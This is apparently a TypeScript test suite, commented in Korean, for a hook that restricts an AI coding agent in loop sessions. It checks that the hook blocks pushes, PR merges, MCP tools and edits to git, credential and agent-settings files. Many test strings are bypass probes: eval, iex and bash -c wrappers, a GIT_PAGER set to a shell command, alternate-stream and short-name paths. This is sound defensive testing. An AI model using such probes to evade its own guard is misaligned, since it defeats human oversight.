    expect(await call('source .venv/bin/activate && cd .git', 'C:\\work\\repo')).not.toBeNull()
    const noHookCwd = session()
    expect(await noHookCwd('source .venv/bin/activate')).toBeNull()
    expect(await noHookCwd('echo x > out.txt')).not.toBeNull()
    const moved = session()
    expect(await moved('source .venv/bin/activate', 'C:\\work\\repo')).toBeNull()
    expect(await moved('echo x > config', 'C:\\work\\repo\\.git')).not.toBeNull()
    expect(await moved('cd src', 'C:\\work\\repo')).toBeNull()
  })
})

describe('loop-lock 읽기 전용 꼴의 PowerShell 환경 대입 (M11 G3)', () => {
  it('[M11-G3 M09-8] $env:GIT_PAGER처럼 git이 명령으로 돌리는 변수를 PowerShell 꼴로 정하는 것도 거부한다', () => {
    expect(loopCommandReason('$env:GIT_PAGER = "sh -c x"; git log', { ...SCOPE, readOnly: true })).not.toBeNull()
    expect(loopCommandReason('Set-Item env:GIT_EXTERNAL_DIFF "x"; git diff', { ...SCOPE, readOnly: true })).not.toBeNull()
    expect(loopCommandReason('ni Env:\\PAGER -Value x; git log', { ...SCOPE, readOnly: true })).not.toBeNull()
    expect(loopCommandReason('$env:GIT_PAGER = "cat"; git log', SCOPE)).toBeNull()
  })
})

describe('loop-lock — 가드와 같은 판독 (M11 G3)', () => {
  const wrapped = (cmd: string): string[] => [`timeout -vs KILL 5 ${cmd}`, `timeout --sig KILL 5 ${cmd}`, `find . -maxdepth 0 -exec ${cmd} \\;`]
  const shelled = (cmd: string): string[] => [`bash -ce "${cmd}"`, `bash -c -x "${cmd}"`]
  it('eval 꼴은 안쪽 글을 다시 판독해 거부한다', () => {
    expect(loopCommandReason('eval gh pr merge 1', SCOPE)).not.toBeNull()
    expect(loopCommandReason('eval git push origin x', SCOPE)).not.toBeNull()
  })
  const probes = [
    ...wrapped('gh pr merge 1'),
    ...wrapped('git push origin x'),
    ...shelled('gh pr merge 1'),
    ...shelled('git push origin x'),
    'gh api -iX DELETE repos/o/r/git/refs/heads/x',
    'gh api -X=PUT repos/o/r/topics',
  ]
  for (const cmd of probes) {
    it(`[M11-G3 M11-17] 거부: ${JSON.stringify(cmd)}`, () => {
      expect(loopCommandReason(cmd, SCOPE)).not.toBeNull()
    })
  }
  const passed = [
    'timeout -vs KILL 5 npm test',
    'bash -ce "git status"',
    'bash -c -x "npm test"',
    'find . -name "*.ts" -exec grep -l push {} \\;',
    'find . -name "*.tmp" -exec rm {} \\;',
    'find src -name "*.sh" -exec chmod +x {} +',
    'find . -name "*.log" -execdir rm -- {} \';\'',
    'gh api -X=GET repos/o/r',
    'gh api -iX GET repos/o/r/pulls',
  ]
  for (const cmd of passed) {
    it(`통과: ${JSON.stringify(cmd)}`, () => {
      expect(loopCommandReason(cmd, SCOPE)).toBeNull()
    })
  }
})

describe('loop-lock — 가드와 같은 판독 (M11 G8)', () => {
  const probes = [
    'iex "gh pr merge 1"',
    'Invoke-Expression "git push origin x"',
    "Start-Process gh -ArgumentList 'pr merge 1'",
    'Start-Process -FilePath git -ArgumentList "push","origin","x"',
    'bash +c "git push origin x"',
    'bash -login -ce "git push origin x"',
    'zsh.exe -c "gh pr merge 1"',
  ]
  for (const cmd of probes) {
    it(`[M11-G8 M11-28 M03-28] 거부: ${JSON.stringify(cmd)}`, () => {
      expect(loopCommandReason(cmd, SCOPE)).not.toBeNull()
    })
  }
  for (const cmd of ['iex "npm test"', 'Start-Process notepad', 'bash -login -c "npm test"']) {
    it(`통과: ${JSON.stringify(cmd)}`, () => {
      expect(loopCommandReason(cmd, SCOPE)).toBeNull()
    })
  }
})

describe('loop-lock MCP 도구 (M09 G2 검수 중요 5)', () => {
  it('루프 세션에서 mcp__ 도구는 이름과 입력에 관계없이 거부한다', () => {
    expect(loopLockReason('mcp__github__create_pull_request', { title: 'x' }, SCOPE)).toContain('MCP')
    expect(loopLockReason('mcp__x__read', {}, SCOPE)).not.toBeNull()
    expect(loopLockReason('Read', { file_path: 'a' }, SCOPE)).toBeNull()
  })
})

describe('loop-lock 판독 한도 (M09 G2)', () => {
  it('명령 치환 중첩이 판독 한도(4)를 넘으면 막는다 — 한도 안은 판독한다', () => {
    expect(loopCommandReason('echo $(echo $(echo $(echo $(echo $(echo hi)))))', SCOPE)).toContain('중첩')
    expect(loopCommandReason('echo $(echo $(echo $(echo $(echo hi))))', SCOPE)).toBeNull()
    expect(loopCommandReason('echo $(echo $(echo $(echo $(git push))))', SCOPE)).not.toBeNull()
  })
})

describe('loop-lock 거부 사유 (M09 G2)', () => {
  it('모든 사유가 「원격은 실행기 코드만」과 「노드는 로컬 커밋까지만」을 말한다', () => {
    for (const cmd of [DENY_REMOTE[0], DENY_CREDENTIAL[0], DENY_CONFIG[0], DENY_EXECUTOR_FILES[0], DENY_OUTSIDE[0], DENY_CLAUDE[0], 'cd .git', 'echo x > $SOMEVAR/x', DENY_REPLACE[0], DENY_GLOBAL_PKG[0], DENY_CWD[0]]) {
      const reason = loopCommandReason(cmd, SCOPE) ?? ''
      expect(reason).toContain('원격은 실행기 코드만')
      expect(reason).toContain('로컬 커밋까지만')
    }
    expect(loopCommandReason('export CDPATH=.git', SCOPE)).toContain('CDPATH')
    expect(loopCommandReason('export CDPATH=.git', SCOPE)).toContain('원격은 실행기 코드만')
  })
})

describe('loop-lock 편집 도구 경로 (M09 G2)', () => {
  const deny: [string, Record<string, unknown>][] = [
    ['Write', { file_path: '.agentdeck/run-state.json', content: '{}' }],
    ['Write', { file_path: 'C:\\work\\repo\\.agentdeck\\verification.md', content: '' }],
    ['Write', { file_path: 'C:/work/repo/.agentdeck/RUN-STATE.JSON', content: '' }],
    ['Write', { file_path: 'C:/work/repo/.agentdeck/run-state.json.', content: '' }],
    ['Edit', { file_path: '.git/config', old_string: 'a', new_string: 'b' }],
    ['MultiEdit', { file_path: 'C:/work/repo/.git/hooks/pre-push', edits: [] }],
    ['NotebookEdit', { notebook_path: '.git/info/x.ipynb', new_source: '' }],
    ['Write', { file_path: 'C:\\Users\\u\\AppData\\Roaming\\agentdeck\\loop\\digests\\k', content: '' }],
    ['Write', { file_path: 'src/../.git/config', content: '' }],
    ['Write', { file_path: 'C:/Users/u/.gitconfig', content: '[credential]' }],
    ['Write', { file_path: 'C:\\Users\\u\\.claude\\settings.json', content: '{}' }],
    ['Write', { file_path: '.claude/settings.json', content: '{}' }],
    ['Edit', { file_path: 'C:/work/repo/.mcp.json', old_string: 'a', new_string: 'b' }],
    ['Write', { file_path: 'C:/work/repo/.agentdeck/run-state.json:stream', content: '' }],
    ['Write', { file_path: 'C:/work/repo/.agentdeck./run-state.json', content: '' }],
    ['Write', { file_path: 'C:/work/repo/.AGENTD~1/RUN-ST~1.JSO', content: '' }],
    ['Write', { file_path: '\\\\?\\C:\\work\\repo\\.git\\config', content: '' }],
    ['Write', { file_path: '\\\\.\\C:\\work\\repo\\.agentdeck\\verification.md', content: '' }],
    ['Write', { file_path: 'C:/work/repo/.git/HEAD', content: '' }],
  ]
  for (const [tool, input] of deny) {
    it(`거부: ${tool} ${JSON.stringify(input['file_path'] ?? input['notebook_path'])}`, () => {
      expect(loopLockReason(tool, input, SCOPE)).not.toBeNull()
    })
  }
  const allow: [string, Record<string, unknown>][] = [
    ['Write', { file_path: '.agentdeck/goals/g1.md', content: '# g1' }],
    ['Edit', { file_path: 'C:/work/repo/.agentdeck/milestone-spec.md', old_string: 'a', new_string: 'b' }],
    ['Write', { file_path: '.agentdeck/decisions.md', content: '' }],
    ['Edit', { file_path: 'src/a.ts', old_string: 'a', new_string: 'b' }],
    ['Read', { file_path: '.agentdeck/run-state.json' }],
    ['Read', { file_path: '.git/config' }],
    ['Read', { file_path: 'C:/Users/u/.gitconfig' }],
    ['Write', { file_path: 'C:/Users/u/AppData/Local/Temp/note.md', content: '' }],
  ]
  for (const [tool, input] of allow) {
    it(`허용: ${tool} ${JSON.stringify(input['file_path'])}`, () => {
      expect(loopLockReason(tool, input, SCOPE)).toBeNull()
    })
  }
  it('경로 판정 함수는 상대·절대·역슬래시·대소문자 꼴을 같게 본다', () => {
    expect(loopPathReason('.agentdeck/run-state.json', SCOPE)).not.toBeNull()
    expect(loopPathReason('c:\\WORK\\repo\\.AgentDeck\\Run-State.json', SCOPE)).not.toBeNull()
    expect(loopPathReason('.agentdeck/goals/g2.md', SCOPE)).toBeNull()
  })
})

describe('loop-lock 훅과 노드 정보 (M09 G2)', () => {
  type Out = { hookSpecificOutput?: { hookEventName: string; permissionDecision: string; permissionDecisionReason: string } }
  const signal = new AbortController().signal

  it('PreToolUse 훅: 명령 도구와 편집 도구의 거부 꼴은 deny, 나머지는 판정 없음', async () => {
    const matcher = buildLoopLockHook(SCOPE)
    expect(matcher).toMatchObject({ timeout: 10, onFailure: 'block' })
    const [hook] = matcher.hooks
    const call = (tool_name: string, tool_input: unknown): Promise<Out> =>
      hook({ hook_event_name: 'PreToolUse', tool_name, tool_input }, 't', { signal })
    expect(await call('Bash', { command: 'git push' })).toMatchObject({
      hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny' },
    })
    expect(await call('PowerShell', { command: 'gh pr create --fill' })).toMatchObject({ hookSpecificOutput: { permissionDecision: 'deny' } })
    expect(await call('Write', { file_path: '.agentdeck/run-state.json', content: '{}' })).toMatchObject({ hookSpecificOutput: { permissionDecision: 'deny' } })
    expect(await call('Bash', { command: 'git commit -m x' })).toEqual({})
    expect(await call('Write', { file_path: '.agentdeck/goals/g1.md', content: '' })).toEqual({})
    expect(await call('Read', { file_path: '.agentdeck/run-state.json' })).toEqual({})
    expect(await call('Bash', {})).toEqual({})
  })

  it('노드 정보: PreToolUse·L3·잠김·실패 시 막음. 앱 세션 등록부(listControlNodes)에는 없다 — 루프 작업 노드 세션에만 붙는다', () => {
    expect(LOOP_LOCK_NODE).toMatchObject({
      id: 'loop-lock',
      point: 'preToolUse',
      judge: 'rule',
      results: ['deny'],
      protection: 'L3',
      locked: true,
      onFailure: 'block',
      timeoutMs: 10000,
    })
    expect(Object.isFrozen(LOOP_LOCK_NODE)).toBe(true)
    expect(listControlNodes().map((n) => n.id)).not.toContain('loop-lock')
  })
})
